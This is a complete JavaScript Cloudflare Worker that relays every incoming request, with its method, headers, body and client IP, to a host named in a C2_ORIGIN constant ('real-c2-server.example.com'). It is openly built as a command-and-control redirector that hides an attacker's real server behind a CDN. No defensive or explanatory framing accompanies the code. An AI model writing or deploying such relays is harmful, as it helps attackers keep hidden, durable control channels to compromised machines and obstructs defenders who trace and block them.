addEventListener('fetch', event => {
  event.respondWith(handleRelay(event.request))
})

const C2_ORIGIN = 'https://real-c2-server.example.com'

async function handleRelay(request) {
  const targetURL = new URL(request.url)
  targetURL.hostname = new URL(C2_ORIGIN).hostname
  targetURL.protocol = 'https:'

  const proxyReq = new Request(targetURL.toString(), {
    method:  request.method,
    headers: request.headers,
    body:    request.body,
  })

  const cfIP = request.headers.get('CF-Connecting-IP')
  if (cfIP) {
    proxyReq.headers.set('X-Forwarded-For', cfIP)
  }

  try {
    return await fetch(proxyReq)
  } catch (err) {
    return new Response(JSON.stringify({ error: 'upstream_unavailable' }), {
      status: 502,
      headers: { 'Content-Type': 'application/json' }
    })
  }
}
